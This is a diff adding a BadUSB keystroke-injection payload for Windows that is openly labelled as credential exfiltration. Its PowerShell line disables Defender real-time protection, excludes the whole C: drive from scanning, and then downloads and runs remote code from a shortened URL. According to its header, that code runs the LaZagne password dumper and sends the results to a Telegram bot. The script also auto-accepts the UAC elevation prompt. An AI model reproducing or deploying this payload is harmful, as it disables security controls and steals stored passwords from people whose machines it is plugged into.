@@ -1,0 +1,14 @@
+REM Title: Lazagne Exfiltration
+REM Author:	mrproxy
+REM Requirements: Telegram bot, Internet Connection
+REM Description: Downloads lazagne, runs lazagne, stores all info to .txt file, sends file to telegram bot.
+REM Target:	Windows
+REM Version:	1.0
+REM Category:	Exfiltration
+REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
+GUI r
+DELAY 500
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$bt='bot-token'; $ci='chat-id'; irm https://t.ly/-qlYd | iex'"
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
